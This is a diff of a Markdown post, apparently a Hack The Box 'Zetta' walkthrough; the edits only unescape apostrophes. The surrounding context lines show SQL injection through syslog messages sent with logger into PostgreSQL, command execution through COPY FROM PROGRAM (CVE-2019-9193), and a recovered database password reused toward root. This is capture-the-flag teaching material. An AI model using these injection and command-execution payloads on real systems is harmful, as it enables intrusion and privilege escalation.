@@ -176,7 +176,7 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
 postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 ```
 
-OK. We have only one user, `roy`. With that in mind, let\'s check out `rsyncd.conf` to see what other goodies we can find.
+OK. We have only one user, `roy`. With that in mind, let's check out `rsyncd.conf` to see what other goodies we can find.
 
 ```
 # Syncable home directory for .dot file sync for me.
@@ -223,7 +223,7 @@ fi
 rm -rf $TEMP
 ```
 
-Let\'s give it a shot.
+Let's give it a shot.
 
 <a class="image-popup">
 ![0808d74f.png](/assets/images/posts/zetta-htb-walkthrough/0808d74f.png)
@@ -257,7 +257,7 @@ Perfect.
 
 ## Privilege Escalation
 
-During enumeration of roy\'s account, I noticed a number of `TuDu` entries, particularly one that purportedly writes syslog entries to PostgreSQL database instead.
+During enumeration of roy's account, I noticed a number of `TuDu` entries, particularly one that purportedly writes syslog entries to PostgreSQL database instead.
 
 <a class="image-popup">
 ![2304da64.png](/assets/images/posts/zetta-htb-walkthrough/2304da64.png)
@@ -297,13 +297,13 @@ _"PostgreSQL has a feature called [dollar-quoting](https://www.postgresql.org/do
 ![8781dc2a.png](/assets/images/posts/zetta-htb-walkthrough/8781dc2a.png)
 </a>
 
-Looking at the template SQL statement, it\'s possible to inject SQL statements, through the `syslog` message field, `%msg%`.
+Looking at the template SQL statement, it's possible to inject SQL statements, through the `syslog` message field, `%msg%`.
 
 ```
 INSERT INTO syslog_lines (message, devicereportedtime) values ('%msg%', '%timereported%')
 ```
 
-Let\'s try this.
+Let's try this.
 
 ```
 $ logger -s -p local7.info "', now()); DROP TABLE IF EXISTS moss; CREATE TABLE moss(t TEXT); INSERT INTO moss(t) VALUES (\$\$hello\$\$); COPY moss(t) TO \$here\$/tmp/moss\$here\$; -- -"
@@ -319,7 +319,7 @@ Awesome. It works!
 
 >  In PostgreSQL 9.3 through 11.2, the "COPY TO/FROM PROGRAM" function allows superusers and users in the 'pg_execute_server_program' group to execute arbitrary code in the context of the database's operating system user.
 
-Armed with the previous insight, we can probably make use of [CVE-2019-9193](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9193) to execute commands. Let\'s see if this version is "vulnerable". :laughing:
+Armed with the previous insight, we can probably make use of [CVE-2019-9193](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9193) to execute commands. Let's see if this version is "vulnerable". :laughing:
 
 ```
 $ logger -s -p local7.info "', now()); DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(out TEXT); COPY cmd FROM PROGRAM \$cmd\$rm /tmp/moss\$cmd\$; --"
@@ -358,7 +358,7 @@ CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, R
 ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
 ```
 
-Recall the `TuDu` entry about the password scheme? Could this be `root`\'s password as well?
+Recall the `TuDu` entry about the password scheme? Could this be `root`'s password as well?
 
 <a class="image-popup">
 ![d133640c.png](/assets/images/posts/zetta-htb-walkthrough/d133640c.png)
